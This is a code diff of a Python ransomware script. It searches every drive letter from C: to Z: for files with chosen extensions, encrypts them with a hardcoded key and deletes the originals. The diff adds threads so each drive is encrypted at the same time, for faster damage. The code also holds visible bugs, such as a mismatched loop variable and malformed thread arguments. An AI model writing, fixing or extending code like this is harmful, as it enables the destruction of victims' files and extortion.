@@ -9,8 +9,10 @@ import itertools
 
 
 ALL_FOUND_FILES = [] # all of the files found on the machine.
-
+GLOBAL_KEY = "TEST KEY %123"
 # Drive files, used for threading.
+
+
 cFiles = []
 dFiles = []
 eFiles = []
@@ -69,13 +71,15 @@ def encrypt(key, filename):
                     chunk += ' ' * (16 - (len(chunk) % 16))
                 outfile.write(encryption.encrypt(chunk))
 
+               
 
-def brickSystem(key):
 
-    if key == "":
-	key = random(16);
-	
-    for target_file in ALL_FOUND_FILES:
+# Bricks the system at a increased rate, bricking each drive concurrently.
+def threadBrick(FILE_LIST):
+    
+    key = GLOBAL_KEY
+
+    for _file in FILE_LIST:
         if os.path.basename(target_file).startswith("!Bricked"):
             pass
         elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
@@ -84,11 +88,11 @@ def brickSystem(key):
          
             encrypt(SHA256.new(key).digest(), str(target_file))
             os.remove(target_file)
-                
+
 
 # Search every drive on the victims computer. Appending the file to the sysFile total list.
 
-# Replace getcwd with '/root' for linux machines, or traverse all drives for windows machines.
+# will implement check for OS system, and use with '/root' for linux machines, or traverse all drives for windows machines.
 
 def discoverFiles():
     
@@ -167,12 +171,88 @@ def discoverFiles():
     t22.join()
     t23.join()
 
-    
+    return
+
        
-    #Concatenate all of our found files.
     
-    sysFiles = list(itertools.chain(cFiles,dFiles,eFiles,fFiles,gFiles,hFiles,iFiles,jFiles,kFiles,lFiles,mFiles,nFiles,oFiles,pFiles,
-                                    qFiles,rFiles,sFiles,tFiles,uFiles,vFiles,wFiles,xFiles,yFiles,zFiles)
+    
+ 
+def thread_bricker():
+    
+
+
+    t1 = threading.Thread(target=threadBrick, args=cFiles)
+    t2 = threading.Thread(target=threadBrick, args=dFiles)
+    t3 = threading.Thread(target=threadBrick, args=eFiles)
+    t4 = threading.Thread(target=threadBrick, args=fFiles)
+    t5 = threading.Thread(target=threadBrick, args=gFiles)
+    t6 = threading.Thread(target=threadBrick, args=hFiles)
+    t7 = threading.Thread(target=threadBrick, args=iFiles)
+    t8 = threading.Thread(target=threadBrick, args=jFiles)
+    t9 = threading.Thread(target=threadBrick, args=kFiles)
+    t10 = threading.Thread(target=threadBrick, args=lFiles)
+    t11 = threading.Thread(target=threadBrick, args=mFiles)
+    t12 = threading.Thread(target=threadBrick, args=nFiles)
+    t13 = threading.Thread(target=threadBrick, args=oFiles)
+    t14 = threading.Thread(target=threadBrick, args=pFiles)
+    t15 = threading.Thread(target=threadBrick, args=qFiles)
+    t16 = threading.Thread(target=threadBrick, args=rFiles)
+    t17 = threading.Thread(target=threadBrick, args=sFiles)
+    t18 = threading.Thread(target=threadBrick, args=tFiles)
+    t19 = threading.Thread(target=threadBrick, args=uFiles)
+    t20 = threading.Thread(target=threadBrick, args=vFiles)
+    t21 = threading.Thread(target=threadBrick, args=wFiles)
+    t22 = threading.Thread(target=threadBrick, args=xFiles)
+    t23 = threading.Thread(target=threadBrick, args=yFiles)
+    t24 = threading.Thread(target=threadBrick, args=zFiles)
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+    t5.start()
+    t6.start()
+    t7.start()
+    t8.start()
+    t9.start()
+    t10.start()
+    t11.start()
+    t12.start()
+    t13.start()
+    t14.start()
+    t15.start()
+    t16.start()
+    t17.start()
+    t18.start()
+    t19.start()
+    t20.start()
+    t21.start()
+    t22.start()
+    t23.start()
+       
+    t1.join()
+    t2.join()
+    t3.join()
+    t4.join()
+    t5.join()
+    t6.join()
+    t7.join()
+    t8.join()
+    t9.join()
+    t10.join()
+    t11.join()
+    t12.join()
+    t13.join()
+    t14.join()
+    t15.join()
+    t16.join()
+    t17.join()
+    t18.join()
+    t19.join()
+    t20.join()
+    t21.join()
+    t22.join()
+    t23.join()
     
     
 extensions = [
@@ -201,6 +281,8 @@ extensions = [
 # Check if the file is a wanted extension
 
 
+
+
 def Search_C_Drive():
 	for dirpath, dirs, files in os.walk("C:\\"):
         for filename in files:
@@ -209,6 +291,9 @@ def Search_C_Drive():
           
             if fname.endswith(tuple(extensions)):
                 cFiles.append(fname)
+
+    return
+
 	
 
 def Search_D_Drive():
@@ -219,6 +304,8 @@ def Search_D_Drive():
           
             if fname.endswith(tuple(extensions)):
                 dFiles.append(fname)
+    return
+
 
 def Search_E_Drive():
     for dirpath, dirs, files in os.walk("E:\\"):
@@ -228,6 +315,7 @@ def Search_E_Drive():
           
             if fname.endswith(tuple(extensions)):
                 eFiles.append(fname)
+    return
 
 def Search_F_Drive():
     for dirpath, dirs, files in os.walk("F:\\"):
@@ -237,6 +325,8 @@ def Search_F_Drive():
           
             if fname.endswith(tuple(extensions)):
                 fFiles.append(fname)
+    return
+
 
 def Search_G_Drive():
     for dirpath, dirs, files in os.walk("G:\\"):
@@ -246,6 +336,8 @@ def Search_G_Drive():
           
             if fname.endswith(tuple(extensions)):
                 gFiles.append(fname)
+    return
+
 
 def Search_H_Drive():
     for dirpath, dirs, files in os.walk("H:\\"):
@@ -255,6 +347,7 @@ def Search_H_Drive():
           
             if fname.endswith(tuple(extensions)):
                 hFiles.append(fname)
+    return
 
 def Search_I_Drive():
     for dirpath, dirs, files in os.walk("I:\\"):
@@ -265,6 +358,8 @@ def Search_I_Drive():
             if fname.endswith(tuple(extensions)):
                 iFiles.append(fname)
 
+    return
+
 def Search_J_Drive():
     for dirpath, dirs, files in os.walk("J:\\"):
         for filename in files:
@@ -273,6 +368,7 @@ def Search_J_Drive():
           
             if fname.endswith(tuple(extensions)):
                 jFiles.append(fname)
+    return
 
 def Search_K_Drive():
     for dirpath, dirs, files in os.walk("K:\\"):
@@ -282,6 +378,7 @@ def Search_K_Drive():
           
             if fname.endswith(tuple(extensions)):
                 kFiles.append(fname)
+    return
 
 def Search_L_Drive():
     for dirpath, dirs, files in os.walk("L:\\"):
@@ -291,6 +388,7 @@ def Search_L_Drive():
           
             if fname.endswith(tuple(extensions)):
                 lFiles.append(fname)
+    return
 
 def Search_M_Drive():
     for dirpath, dirs, files in os.walk("M:\\"):
@@ -300,6 +398,7 @@ def Search_M_Drive():
           
             if fname.endswith(tuple(extensions)):
                 mFiles.append(fname)
+    return
 
 def Search_N_Drive():
     for dirpath, dirs, files in os.walk("N:\\"):
@@ -309,6 +408,7 @@ def Search_N_Drive():
           
             if fname.endswith(tuple(extensions)):
                 nFiles.append(fname)
+    return
 
 def Search_O_Drive():
     for dirpath, dirs, files in os.walk("O:\\"):
@@ -318,6 +418,8 @@ def Search_O_Drive():
           
             if fname.endswith(tuple(extensions)):
                 oFiles.append(fname)
+    return
+
 
 def Search_P_Drive():
     for dirpath, dirs, files in os.walk("P:\\"):
@@ -327,6 +429,7 @@ def Search_P_Drive():
           
             if fname.endswith(tuple(extensions)):
                 pFiles.append(fname)
+    return
 
 def Search_Q_Drive():
     for dirpath, dirs, files in os.walk("Q:\\"):
@@ -336,6 +439,7 @@ def Search_Q_Drive():
           
             if fname.endswith(tuple(extensions)):
                 qFiles.append(fname)
+    return
 
 def Search_R_Drive():
     for dirpath, dirs, files in os.walk("R:\\"):
@@ -345,6 +449,7 @@ def Search_R_Drive():
           
             if fname.endswith(tuple(extensions)):
                 rFiles.append(fname)
+    return
 
 def Search_S_Drive():
     for dirpath, dirs, files in os.walk("S:\\"):
@@ -354,6 +459,7 @@ def Search_S_Drive():
           
             if fname.endswith(tuple(extensions)):
                 sFiles.append(fname)
+    return
 
 def Search_T_Drive():
     for dirpath, dirs, files in os.walk("T:\\"):
@@ -363,6 +469,7 @@ def Search_T_Drive():
           
             if fname.endswith(tuple(extensions)):
                 tFiles.append(fname)
+    return
 
 def Search_U_Drive():
     for dirpath, dirs, files in os.walk("U:\\"):
@@ -372,6 +479,7 @@ def Search_U_Drive():
           
             if fname.endswith(tuple(extensions)):
                 uFiles.append(fname)
+    return
 
 def Search_V_Drive():
     for dirpath, dirs, files in os.walk("V:\\"):
@@ -381,6 +489,7 @@ def Search_V_Drive():
           
             if fname.endswith(tuple(extensions)):
                 vFiles.append(fname)
+    return
 
 def Search_W_Drive():
     for dirpath, dirs, files in os.walk("W:\\"):
@@ -390,6 +499,7 @@ def Search_W_Drive():
           
             if fname.endswith(tuple(extensions)):
                 wFiles.append(fname)
+    return
 
 def Search_X_Drive():
     for dirpath, dirs, files in os.walk("X:\\"):
@@ -399,6 +509,7 @@ def Search_X_Drive():
           
             if fname.endswith(tuple(extensions)):
                 xFiles.append(fname)
+    return
 
 def Search_Y_Drive():
     for dirpath, dirs, files in os.walk("Y:\\"):
@@ -408,6 +519,7 @@ def Search_Y_Drive():
           
             if fname.endswith(tuple(extensions)):
                 yFiles.append(fname)
+    return
 
 def Search_Z_Drive():
     for dirpath, dirs, files in os.walk("Z:\\"):
@@ -417,16 +529,17 @@ def Search_Z_Drive():
           
             if fname.endswith(tuple(extensions)):
                 zFiles.append(fname)
+    return
 
 
 
 def main():
-    user_key = "EXAMPLE KEY" 
+    
                     
     discoverFiles() # Find all files   
-                    
-    brickSystem(user_key)
-    print("Unlucky, your files have been compromised")
+    thread_bricker() # Encrypt all files               
+    
+    
    
     
 
